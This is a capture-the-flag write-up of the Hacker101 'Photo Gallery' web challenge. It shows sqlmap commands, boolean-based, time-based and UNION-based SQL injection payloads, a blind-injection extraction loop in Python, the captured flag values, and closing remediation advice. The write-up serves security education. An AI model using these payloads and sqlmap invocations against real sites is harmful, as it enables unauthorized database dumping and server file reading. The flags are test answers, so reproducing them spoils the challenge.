# Photo Gallery - Web Security Challenge Writeup

**Difficulty:** Medium  
**Category:** Web Security / SQL Injection  
**Flags:** 2/3 (Partial completion)  
**Platform:** Hacker101 CTF

---

## 🎯 Challenge Overview

The Photo Gallery challenge is a web application that displays images and demonstrates classic SQL injection vulnerabilities. The application fetches photos based on URL parameters, creating opportunities for both basic and advanced SQL injection attacks including Blind SQL injection techniques.

---

## 🔍 Initial Reconnaissance

### Application Analysis
Upon first inspection, the photo gallery application appeared to function as a simple image display service:

1. **Image Display**: Application shows photos based on ID parameters
2. **URL Structure**: Uses `fetch?id=X` parameter structure  
3. **Error Handling**: Different error responses for various inputs
4. **Backend**: MySQL database with photo metadata storage

### Key Observations
- **Error 500** encountered on certain photo IDs (id=3)
- **HTTP 405 error** when attempting POST requests instead of GET
- **URL parameter** `id` appears to be directly processed by database queries
- **Blind SQL injection** vulnerability present in the `id` parameter

---

## 🚩 Flag 1: SQL Injection Exploitation

### Discovery Process
Initial testing revealed the application's vulnerability to SQL injection attacks through systematic parameter manipulation.

### SQLMap Exploitation
Using SQLMap for automated SQL injection testing:

```bash
sqlmap -u "https://1620798aae5c2576bbcf730c45e4cc59.ctf.hacker101.com/fetch?id=1" --dbs --batch --threads 10
```

### Vulnerability Confirmation
SQLMap identified two types of SQL injection:

```
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1015=1015

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 1035 FROM (SELECT(SLEEP(5)))fMTp)
```

### Database Structure Discovery
**Backend Database**: MySQL >= 5.0.12 (MariaDB fork)  
**Web Technology**: OpenResty 1.27.1.2  
**Target Database**: `level5`  
**Target Table**: `photos`  
**Key Column**: `filename`

### Data Extraction
Using targeted SQLMap commands to dump specific table data:

```bash
sqlmap -u "https://[target]/fetch?id=1" -D level5 -T photos -C filename --dump --batch --threads 5
```

### 🏁 First Flag Captured
```
c544ef210f04b81955b20380c262c72b468f5d27298c19e3d54e905ae31e5e2b
```

**Technique Used**: Blind SQL injection via automated SQLMap exploitation to extract database contents.

---

## 🔓 Understanding SQL Injection Vulnerabilities

### What is Blind SQL Injection?

**Blind SQL Injection** occurs when:

1. **Application is vulnerable** to SQL injection but doesn't return database errors
2. **No direct output** of query results in the response
3. **Behavior differences** reveal information about database queries
4. **Time-based or boolean-based** inference techniques required

### Attack Types Identified

```
┌─────────────────────┐    ┌──────────────────────┐    ┌─────────────────────┐
│   Boolean-Based     │    │   Time-Based         │    │   UNION-Based       │
│                     │    │                      │    │                     │
│ AND 1=1 (True)      │    │ AND SLEEP(5)         │    │ UNION SELECT        │
│ AND 1=2 (False)     │    │ Response delayed     │    │ Direct data access  │
│ Different responses │    │ vs normal timing     │    │ File system access  │
└─────────────────────┘    └──────────────────────┘    └─────────────────────┘
```

### Database Schema Discovery
The exploitation revealed:

```sql
Database: level5
Table: photos
Columns: filename (and likely id, other metadata)

Extracted Data:
+------------------------------------------------------------------+
| filename                                                         |
+------------------------------------------------------------------+
| c544ef210f04b81955b20380c262c72b468f5d27298c19e3d54e905ae31e5e2b |
| files/adorable.jpg                                               |
| files/purrfect.jpg                                               |
+------------------------------------------------------------------+
```

---

## 🛠️ Advanced Exploitation Techniques

### Research and Discovery
After capturing the first flag, analysis of the application architecture led to discovery of additional attack vectors through configuration file access.

### UNION-Based File Reading
**Target Configuration**: uwsgi configuration files
**Reference**: [uwsgi-nginx-flask-docker repository](https://github.com/tiangolo/uwsgi-nginx-flask-docker)

### File System Access
Using UNION SELECT to read server files:

```sql
fetch?id=0 UNION SELECT 'main.py'
```

**URL Encoded Version**:
```
fetch?id=4%20UNION%20SELECT%20%27main.py%27
```

### 🏁 Second Flag Captured
```
^FLAG^b0505ec012965bd54a227552d5c9f113187f785d66e3c35ae1b7f170cefc3ace$FLAG$
```

**Technique Used**: UNION-based SQL injection to read server configuration files and source code.

---

## 🔧 Technical Deep Dive

### SQL Injection Attack Mechanics

```python
# Vulnerable query structure (conceptual)
query = f"SELECT filename FROM photos WHERE id = {user_input}"

# Malicious input examples:
# user_input = "1 AND 1=1"           # Boolean test
# user_input = "1 AND SLEEP(5)"      # Time delay test  
# user_input = "1 UNION SELECT 'file'" # File reading
```

### Blind SQL Injection Process

```python
# Simplified blind SQLi logic
def blind_sqli_attack(target_url, payload_base):
    for position in range(1, max_length):
        for char_code in range(32, 127):  # Printable ASCII
            payload = f"{payload_base} AND ASCII(SUBSTRING(database(),{position},1))={char_code}"
            
            response = send_request(target_url + payload)
            
            if is_true_response(response):
                extracted_data += chr(char_code)
                break
    
    return extracted_data
```

### Error Analysis
**HTTP 405 Error**: Method not allowed - indicates POST requests rejected
**Error 500**: Internal server error - potentially indicates SQL syntax errors
**Response Timing**: Variations indicate successful time-based injection

---

## 🛡️ Security Recommendations

### Immediate Fixes

1. **Parameterized Queries**
```python
# Vulnerable code
query = f"SELECT filename FROM photos WHERE id = {user_input}"

# Secure approach
cursor.execute("SELECT filename FROM photos WHERE id = %s", (user_input,))
```

2. **Input Validation**
```python
# Validate input type and range
def validate_photo_id(user_input):
    try:
        photo_id = int(user_input)
        if 1 <= photo_id <= 1000:  # Valid range
            return photo_id
    except ValueError:
        pass
    raise ValueError("Invalid photo ID")
```

3. **Database Permissions**
```sql
-- Limit database user permissions
REVOKE FILE ON *.* FROM 'webapp_user'@'localhost';
REVOKE ALL PRIVILEGES ON mysql.* FROM 'webapp_user'@'localhost';
```

### Long-term Security Measures

- **Use ORM frameworks** with built-in SQL injection protection
- **Implement prepared statements** for all database queries
- **Apply principle of least privilege** for database connections
- **Regular security testing** including automated SQL injection scans
- **Web Application Firewall (WAF)** to filter malicious requests

---

## 📚 Learning Resources

### SQL Injection Techniques
- 📖 [SQLMap Documentation](https://sqlmap.org/) - Comprehensive SQL injection testing
- 📺 [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) - Attack methodology
- 🎓 [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection) - Hands-on practice

### Blind SQL Injection
- 🔬 [Blind SQL Injection Techniques](https://owasp.org/www-community/attacks/Blind_SQL_Injection) - Manual exploitation methods
- 📖 [Advanced SQL Injection](https://portswigger.net/web-security/sql-injection/blind) - Time-based and boolean-based attacks
- 🎓 [HackerOne SQL Injection Reports](https://hackerone.com/reports?keyword=sql%20injection) - Real-world examples

---

## 🎓 Key Takeaways

### Technical Skills Developed
1. **SQL injection identification** - Recognizing vulnerable parameters and error patterns
2. **Automated exploitation tools** - Effective use of SQLMap for complex attacks
3. **Blind injection techniques** - Boolean-based and time-based inference methods
4. **File system access** - UNION-based queries for server file reading

### Security Lessons Learned
1. **Input validation is critical** - All user input must be properly sanitized
2. **Database permissions matter** - Limit application database user privileges
3. **Error handling security** - Consistent error messages prevent information leakage
4. **Defense in depth** - Multiple layers of protection prevent exploitation

---

## 🔗 References and Credits

- **Primary Tool**: [SQLMap](https://sqlmap.org/) - Automated SQL injection testing framework
- **Configuration Reference**: [uwsgi-nginx-flask-docker](https://github.com/tiangolo/uwsgi-nginx-flask-docker) - Server architecture insights
- **Burp Suite**: Manual request interception and analysis
- **Hacker101 CTF**: Educational platform for hands-on security learning

---

## 🏆 Challenge Status

- **Completion**: 2/3 flags (67% complete)
- **Techniques Mastered**: 
  - Blind SQL injection exploitation ✅
  - Automated SQLMap usage ✅
  - UNION-based file reading ✅
  - Database structure enumeration ✅
- **Skills Demonstrated**: SQL injection vulnerability assessment, automated tool utilization, server configuration analysis

This challenge provided comprehensive hands-on experience with SQL injection vulnerabilities, from basic parameter manipulation to advanced blind injection techniques and file system access - essential skills for web application penetration testing and security assessment.